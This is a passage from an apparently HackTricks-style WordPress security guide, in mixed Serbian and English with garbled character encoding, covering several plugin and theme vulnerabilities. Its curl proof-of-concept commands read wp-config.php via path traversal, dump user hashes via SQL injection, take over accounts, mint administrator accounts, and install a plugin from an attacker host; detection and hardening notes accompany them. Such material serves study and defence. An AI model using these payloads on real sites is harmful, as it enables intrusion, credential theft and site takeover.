- Preimenujte fajl `wp-admin.php` i omoguÄ‡ite pristup samo interno ili sa odreÄ‘enih IP adresa.


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin je izloÅ¾io zadatak **savecategory** koji na kraju izvrÅ¡ava sledeÄ‡i ranjivi kod u okviru `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemi koje uvodi ovaj isjeÄak:

1. **Nefiltrirani korisniÄki unos** â€“ `parentid` dolazi direktno iz HTTP zahteva.
2. **Konkatenacija stringova u WHERE klauzuli** â€“ nema `is_numeric()` / `esc_sql()` / prepared statement.
3. **Pristup bez autentikacije** â€“ iako se akcija izvrÅ¡ava preko `admin-post.php`, jedina provera je **CSRF nonce** (`wp_verify_nonce()`), koji bilo koji posetilac moÅ¾e dobiti sa javne stranice koja ubacuje shortcode `[wpjobportal_my_resumes]`.

#### Eksploatacija

1. Nabavite sveÅ¾ nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injektujte proizvoljan SQL zloupotrebom `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Odgovor otkriva rezultat injektovanog upita ili menja bazu podataka, Äime se dokazuje SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

JoÅ¡ jedan zadatak, **downloadcustomfile**, omoguÄ‡avao je posetiocima da preuzmu **bilo koji fajl na disku** putem path traversal.  Ranljivi sink se nalazi u `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` je pod kontrolom napadaÄa i konkateniran **bez sanitizacije**. Ponovo, jedino ograniÄenje je **CSRF nonce** koji se moÅ¾e dohvatiti sa stranice resume.

#### Eksploatacija
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
The server vraÄ‡a sadrÅ¾aj `wp-config.php`, leaking DB credentials and auth keys.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Mnogi themes/plugins ukljuÄuju "social login" pomoÄ‡ne funkcije izloÅ¾ene preko admin-ajax.php. Ako neautentifikovana AJAX akcija (wp_ajax_nopriv_...) veruje identifikatorima koje klijent poÅ¡alje kada podaci provajdera nedostaju, a zatim pozove wp_set_auth_cookie(), to omoguÄ‡ava potpuno zaobilaÅ¾enje autentifikacije.

TipiÄan ranjiv obrazac (pojednostavljeno)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
ZaÅ¡to je ranjivo

- Neautentifikovan pristup putem admin-ajax.php (wp_ajax_nopriv_â€¦ action).
- Nema nonce/capability provera pre promene stanja.
- Nedostaje OAuth/OpenID provider verification; default branch prihvata unos napadaÄa.
- get_user_by('email', $_POST['id']) nakon Äega sledi wp_set_auth_cookie($uid) autentifikuje podnosioca zahteva kao bilo kog korisnika sa postojeÄ‡om email adresom.

Eksploatacija (neautentifikovano)

- Preduslovi: napadaÄ moÅ¾e da pristupi /wp-admin/admin-ajax.php i zna/pretpostavi vaÅ¾eÄ‡u korisniÄku email adresu.
- Podesite provider na nepodrÅ¾anu vrednost (ili ga izostavite) da biste pogodili default branch i poslali id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
OÄekivani indikatori uspeha

- HTTP 200 sa JSON telom poput {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* za Å¾rtvin nalog; naknadni zahtevi su autentifikovani.

Pronalazak imena akcije

- Pregledajte theme/plugin za add_action('wp_ajax_nopriv_...', '...') registracije u social login kodu (npr. framework/add-ons/social-login/class-social-login.php).
- Grep-ujte za wp_set_auth_cookie(), get_user_by('email', ...) unutar AJAX handler-a.

Kontrolna lista za detekciju

- Web logovi koji pokazuju unauthenticated POST-ove ka /wp-admin/admin-ajax.php sa social-login akcijom i id=<email>.
- 200 odgovori sa success JSON-om neposredno pre autentifikovanog saobraÄ‡aja sa iste IP/User-Agent kombinacije.

OjaÄavanje

- Ne izvodite identitet iz klijentskog inputa. Prihvatati samo emails/IDs koji potiÄu od validiranog provider token/ID.
- Zahtevajte CSRF nonces i capability checks Äak i za login helper-e; izbegavajte registraciju wp_ajax_nopriv_ osim ako nije strogo neophodno.
- Validirajte i verifikujte OAuth/OIDC odgovore server-side; odbacite nedostajuÄ‡e/invalidne providere (bez fallback-a na POST id).
- Razmotrite privremeno onemoguÄ‡avanje social login-a ili virtuelno zakrpljivanje na edge-u (blokirajte ranjivu akciju) dok se ne popravi.

Ispravljeno ponaÅ¡anje (Jobmonster 4.8.0)

- Uklonjen nesigurni fallback iz $_POST['id']; $user_email mora poticati iz verifikovanih provider grana u switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers â‰¤ 1.0.82)

Neki plugin-ovi izlaÅ¾u REST endpoint-e koji generiÅ¡u reusable â€œconnection keysâ€ ili tokene bez verifikacije capabilities pozivaoca. Ako ruta autentifikuje samo na osnovu pogaÄ‘ajuÄ‡eg atributa (npr. username) i ne veÅ¾e kljuÄ za korisnika/session sa capability checks, bilo koji unauthenticated napadaÄ moÅ¾e izdati kljuÄ i pozvati privilegovane akcije (kreiranje admin naloga, plugin akcije â†’ RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: prihvata username, izdaje connection key bez current_user_can() ili striktne permission_callback
- Impact: potpuni takeover povezivanjem izdanog kljuÄa sa internim privilegovanim akcijama

PoC â€“ izdati connection key i iskoristiti ga
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# â†’ {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
ZaÅ¡to je ranjivo
- Osetljiva REST ruta zaÅ¡tiÄ‡ena samo dokazom identiteta niske entropije (username) ili bez permission_callback
- Nema provere capability; generisani kljuÄ se prihvata kao univerzalni bypass

Provera za detekciju
- PretraÅ¾ite kod plugina za register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Bilo koja ruta koja izdaje tokene/kljuÄeve na osnovu identiteta dostavljenog u zahtevu (username/email) bez vezivanja za autentifikovanog korisnika ili capability
- PotraÅ¾ite naredne rute koje prihvataju generisani token/kljuÄ bez server-side provere capability-a

OjaÄavanje
- Za svaku privilegovanu REST rutu: zahtevajte permission_callback koji poziva current_user_can() za potrebnu capability
- Ne generiÅ¡ite dugoveÄne kljuÄeve na osnovu identiteta dostavljenog od klijenta; ako je neophodno, izdajte kratkotrajne tokene vezane za korisnika posle autentifikacije i ponovo proverite capability prilikom upotrebe
- Validirajte korisniÄki kontekst pozivaoca (wp_set_current_user nije sam po sebi dovoljan) i odbijte zahteve gde !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse â†’ unauthenticated arbitrary plugin installation (FunnelKit Automations â‰¤ 3.5.3)

Nonces spreÄavaju CSRF, a ne autorizaciju. Ako kod tretira prolaz nonce-a kao zeleno svetlo i zatim preskaÄe provere capability za privilegovane operacije (npr., install/activate plugins), neautentifikovani napadaÄi mogu zadovoljiti slabu nonce proveru i dostiÄ‡i RCE instaliranjem backdoored ili ranjivog plugina.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce â€œpassesâ€
- Impact: potpuna kompromitacija putem proizvoljne instalacije/aktivacije plugina

PoC (oblik zavisi od plugina; sluÅ¾i samo kao ilustracija)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider â‰¤ 3.6.1)

Multiple depicter-* actions consumed the s (search) parameter and concatenated it into SQL queries without parameterization.

- Parametar: s (search)
- Propust: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Uticaj: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detekciona kontrolna lista
- Koristite grep za depicter-* action handlers i direktnu upotrebu $_GET['s'] ili $_POST['s'] u SQL-u
- Pregledajte prilagoÄ‘ene upite prosleÄ‘ene u $wpdb->get_results()/query() koji konkateniraju s

OjaÄavanje
- Uvek koristite $wpdb->prepare() ili wpdb placeholders; odbacujte neoÄekivane metakaraktere na serverskoj strani
- Dodajte strogu allowlistu za s i normalizujte na oÄekivani charset/duÅ¾inu

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

Prihvatanje putanja pod kontrolom napadaÄa u template parametru bez normalizacije/ograniÄenja omoguÄ‡ava Äitanje proizvoljnih lokalnih fajlova, a ponekad i izvrÅ¡avanje koda ako se PHP/log fajlovi koji se mogu include-ovati uÄitaju u runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: nema normalizacije/allowlistinga; traversal permitted
- Impact: otkrivanje tajni (wp-config.php), potencijalni RCE u specifiÄnim okruÅ¾enjima (log poisoning, includable PHP)

PoC â€“ proÄitajte wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- Bilo koji handler koji konkatenira request putanje u include()/require()/read sinkove bez provere containment-a preko realpath()
- TraÅ¾ite obrasce traversal-a (../) koji izlaze izvan predviÄ‘enog templates direktorijuma

Hardening
- Sprovodite listu dozvoljenih template-ova; reÅ¡avajte putanje pomoÄ‡u realpath() i zahtevajte str_starts_with(realpath(file), realpath(allowed_base))
- Normalizujte ulaz; odbacujte traversal sekvence i apsolutne putanje; koristite sanitize_file_name() samo za imena fajlova (ne za pune putanje)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
